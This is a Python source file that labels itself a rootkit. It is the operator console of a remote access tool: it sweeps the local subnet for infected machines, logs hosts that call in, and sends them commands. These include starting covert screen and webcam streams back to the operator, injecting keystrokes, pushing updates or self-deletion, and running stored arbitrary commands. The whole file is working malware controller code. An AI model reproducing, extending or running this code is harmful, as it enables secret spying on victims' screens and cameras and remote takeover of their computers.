import socket
import os, re, time
from vidstream import StreamingServer
from inputimeout import inputimeout, TimeoutOccurred
import threading

def testIfIpTrue(data, total=False):
    if total == False:
        datasplit = data.split('.')
        for i in range(len(datasplit)):
            if int(datasplit[i]) > 255:
                return False
        return True
    if total != False:
        datasplit = data.split('.')
        return testIfIpTrue(data) == True and len(datasplit) == 4

def Ip(data, ipmodify="0"):
    global ipHost
    if data == "modify":
        if testIfIpTrue(ipmodify, True) == True:
            ipyou = open("ip.txt", "w")
            ipyou.write(ipmodify)
            ipyou.close()
            ipHost = Ip("return")
            clear()
            restart()
            return True
        else:
            print("invalid ip")
            return False
    if data == "return":
        try:
            ipyou = open("ip.txt", "r")
            ret = (ipyou.readlines())[0]
            ipyou.close()
            return ret
        except:
            ipyou = open("ip.txt", "w")
            ipyou.write("nothing")
            ipyou.close()
            return "nothing"
        
def stopSpaceError(data):
    data = " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
    return data

def restart():
    global ipToConnect, ipHost, port
    ipToConnect = str()
    ipHost = Ip("return")
    port = 22228
    print("###################################"+"                                                          connect to "+ipHost)
    print("##### r007k17 by 7r1574n n13l #####")
    print("###################################"+"                                                          port "+str(port))
def starting():
    clear()
    restart()
    ret = None
    if ipHost == "nothing":
        while ret != True:
            ret = Ip("modify", input("write your ip : "))

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
def help(data):
    if data == "command":
        ligne = None
        f = open("help.txt", "r")
        while ligne != "___________________________________________________________________ ":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            if ligne != "___________________________________________________________________ ":
                print(ligne)
        f.close()
    if data == "sending":
        f = open('help.txt', 'r')
        NumberOfLine = 0
        for line in f:
            NumberOfLine += 1
        f.close()
        f = open("help.txt", "r")
        ligne = None
        x = 0
        while ligne != "___________________________________________________________________ ":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            x += 1
        count = 0
        ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
        while ligne != "___________________________________________________________________ ":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            if ligne != "___________________________________________________________________ ":
                print(ligne)
    if data == "cmd":
        f = open('help.txt', 'r')
        NumberOfLine = 0
        for line in f:
            NumberOfLine += 1
        f.close()
        f = open("help.txt", "r")
        ligne = None
        x = 0
        while ligne != "___________________________________________________________________ ":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            x += 1
        ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
        while ligne != "___________________________________________________________________ ":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            x += 1
        ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
        while ligne != "___________________________________________________________________":
            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
            if ligne != "___________________________________________________________________":
                print(ligne)

def testAll(speed=0.3, other=None):
    listIpAvailable, ipHostList = [], ipHost.split(".")
    if other != None:
        other = other.split("-")
        ipHostList.pop(len(ipHostList)-1)
    else:
        other=["temp"]
    if speed == True:
        speed = 0.1
    ipHostList.pop(len(ipHostList)-1)
    ipHostList = ".".join(ipHostList)
    for f in range(len(other)):
        if other[0] != "temp":
            three = other[f]
            three = "."+three
        else:
            three=""
        for i in range(256):
            command("co "+ipHostList+three+"."+str(i))
            server = creatClient(ipHostList+three+"."+str(i), speed)
            if server == True:
                print("connect to "+ipHostList+three+"."+str(i))
                time.sleep(8)
                listIpAvailable.append(ipHostList+three+"."+str(i))
                sendData("left")
                time.sleep(1)
                try:
                    camera.stop_server()
                    screen.stop_server()
                    server = False
                except:
                    pass
    if len(listIpAvailable) > 0 :
        print(listIpAvailable)
    else:
        print("il n'y a aucune ip disponible")
    command(input(">"))

def testEmptyLine(nameFile):
    numberLine = (len((open(nameFile,'r')).readlines()))
    file = (open(nameFile, 'r'))
    ligne = 0
    numbsup = 0
    lignesup = []
    for i in range(numberLine):
        readln = file.readline()
        ligne = ligne + 1 
        if readln == "\n":
            lignesup.append(ligne)
            numbsup += 1
    lignesup.sort(reverse=True)
    for i in range(numbsup):
        supLine(nameFile, lignesup[i])
    file.close()

def supLine(filename, line_to_delete):
    initial_line = 1
    file_lines = {}
    with open(filename) as f:
        content = f.readlines() 
    for line in content:
        file_lines[initial_line] = line.strip()
        initial_line += 1
    f = open(filename, "w")
    for line_number, line_content in file_lines.items():
        if line_number != line_to_delete:
            f.write('{}\n'.format(line_content))
    f.close()
    
def printFileCmd():
    filename = "cmd.txt"
    testEmptyLine(filename)
    with open(filename) as fp:
       line = fp.readline()
       cnt = 1
       while line:
           print("Line {}: {}".format(cnt, line.strip()))
           line = fp.readline()
           cnt += 1
    fp.close()

def retLineCmd(filename, numberline):
    with open(filename) as fp:
       line = fp.readline()
       cnt = 1
       while line:
            if cnt == numberline:
                return("{}".format(line.strip()))
            line = fp.readline()
            cnt += 1
    
def command(commandToExecute):
    commandToExecute = stopSpaceError(commandToExecute)
    commandToExecuteList = commandToExecute.split()
    global ipToConnect, ip, run
    try:
        if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
            if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
                ip = commandToExecuteList[1]
            else:
                print("[ERROR]: no ip requested")
                command(input(">"))
        elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
            getIp()
        elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
            listIp()
            command(input(">"))
        elif commandToExecute in ("stop"):
            global progrun
            progrun = False
        elif commandToExecute in ("help", "aide"):
            help("command")
            command(input(">"))
        elif commandToExecuteList[0] in ("modify", "modifyip"):
            if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
                ret = Ip("modify", commandToExecuteList[1])
                if ret == True:
                    print("#                                 #")
                    print("##########  ip modified  ##########")
                command(input(">"))
            else:
                print("no ip write")
                command(input(">"))
        elif commandToExecute in ("clear", "cleared", "cls", "restart"):
            clear()
            restart()
            command(input(">"))
        elif commandToExecuteList[0] in ("testall", "testAll"):
            if len(commandToExecuteList) > 2:
                if commandToExecuteList[len(commandToExecuteList)-1] in ("speed", "spd"):
                    testAll(speed=0.25, other=commandToExecuteList[1])
                else:
                    print("syntax error")
            elif len(commandToExecuteList) > 1:
                if commandToExecuteList[len(commandToExecuteList)-1] in ("speed", "spd"):
                    testAll(speed=True)
                else:
                    testAll(other=commandToExecuteList[1])
            else:
                testAll()
        elif commandToExecuteList[0] in ("cmd"):
            try:
                temp = run
            except:
                temp = True
            run = True
            clear()
            print("your in the cmd space")
            while run == True:
                registerCmdAcces(input(">"))
            run = temp
            clear()
            restart()
            command(input(">"))
        else:
            print("Error")
            command(input(">"))
    except:
        command(input(">"))

def registerCmdAcces(data):
    global run
    data = stopSpaceError(data)
    dataList = data.split()
    try:
        if dataList[0] in ("register", "enregistre"):
            customcmd = open("cmd.txt", "a")
            temp = "\n"+" ".join(dataList[1:len(dataList)])
            customcmd.write(temp)
            customcmd.close()
            registerCmdAcces(input(">"))
        elif data in ("help"):
            help("cmd")
            registerCmdAcces(input(">"))
        elif data in ("cmdList", "commandlist", "listcmd", "listcommand", "list"):
            try:
                printFileCmd()
            except:
                print("no cmd register")
                print("to register a cmd write register (and enter your cmd here)")
            registerCmdAcces(input(">"))
        elif data in ("clear", "cls"):
            clear()
            print("your in the cmd space")
        elif data in ("back"):
            run = False
        elif dataList[0] in ("sup", "del"):
            if len(dataList) > 2 and dataList[2].isdigit() == True:
                dataList[2] = int(dataList[2])
                supLine("cmd.txt", dataList[2])
            elif len(dataList) > 1 and dataList[1].isdigit() == True:
                dataList[1] = int(dataList[1])
                supLine("cmd.txt", dataList[1])
            else:
                print("no int write")
        else:
            print("Error")
            registerCmdAcces(input(">"))
    except:
        registerCmdAcces(input(">"))
    
def sendData(data):
    global run
    datalist = data.split()
    try:
        if data in ("die", "kill"):
            try:
                client.send("die".encode())
            except:
                pass
            run = False
        elif data in ("help", "aide"):
            help("sending")
        elif data in ("cmd"):
            try:
                temp = run
            except:
                temp = True
            run = True
            clear()
            print("your in the cmd space")
            while run == True:
                registerCmdAcces(input(">"))
            run = temp
            clear()
            restart()
        elif datalist[0] in ("cmd"):
            if len(datalist) > 2 and datalist[2].isdigit() == True:
                datalist[2] = int(datalist[2])
                sendData(retLineCmd("cmd.txt", datalist[2]))
            elif len(datalist) > 1 and datalist[1].isdigit() == True:
                datalist[1] = int(datalist[1])
                sendData(retLineCmd("cmd.txt", datalist[1]))
            else:
                print("no int write")
        elif data in ("left", "quit", "restart"):
            try:
                client.send("left".encode())
            except:
                pass
            run = False
        elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
            client.send("screen".encode())
        elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
            screenStop()
        elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
            client.send("camera".encode())
        elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
            cameraStop()
        elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
            datalist.pop(0)
            data = "fast "+" ".join(datalist)
            client.send(data.encode())
        elif data in ("update"):
            run = False
            client.send("update".encode())
        elif datalist[0] in ("update"):
            run = False
            if datalist[1] in ("delete", "del", "sup", "clear", "cls", "cleared"):
                client.send("updelte".encode())
            else:
                client.send("update".encode())
        else:
            client.send(data.encode())
    except:
        pass

def getIp():
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind((ipHost, 22228))
    serverSocket.listen()
    (clientConnected, clientAddress) = serverSocket.accept()
    print("Connection acquired from %s:%s" % (clientAddress[0], clientAddress[1]))
    serverSocket.close()
    addIp(clientAddress[0])
    command(input(">"))


def addIp(ipToAdd):
    f = open("ListIp.txt", "a")
    f.write(ipToAdd + "\n")
    f.close()


def listIp():
    f = open("ListIp.txt", "r")
    lines = f.readlines()
    for line in lines:
        print(line)
    f.close()
    command(input(">"))


def screenStop():
    global screen
    screen.stop_server()
    screen = StreamingServer(ipHost, 22224)
    t = threading.Thread(target=screen.start_server)
    t.start()
    
def cameraStop():
    global camera
    camera.stop_server()
    camera = StreamingServer(ipHost, 22225)
    t = threading.Thread(target=camera.start_server)
    t.start()

def creatClient(ip, timeout):
    global screen, camera, client, run
    client, tryit = socket.socket(socket.AF_INET, socket.SOCK_STREAM), 0
    client.settimeout(timeout)
    while tryit <= 2:
        try:
            client.connect((ip, port))
            screen = StreamingServer(ipHost, 22224)
            t = threading.Thread(target=screen.start_server)
            t.start()
            camera = StreamingServer(ipHost, 22225)
            t = threading.Thread(target=camera.start_server)
            t.start()
            return True
        except:
            tryit += 1
            if tryit >= 2:
                run = False
                try:
                    print("can't connect to "+ip)
                except:
                    print("ip isn't allowed")
                return False

starting()

progrun = True

while progrun == True:
    ip = ""
    command(input(">"))
    run = True
    if progrun == True:
        server = creatClient(ip, 3)
    while run == True and progrun == True:
        try:
            dataToSend = inputimeout(prompt="%s>" % (ip), timeout=120)
        except:
            dataToSend = "left"
        sendData(dataToSend)
    try:
        if server == True:
            camera.stop_server()
            screen.stop_server()
            server = False
    except:
        pass
print("prog stop")
time.sleep(0.5)
exit()
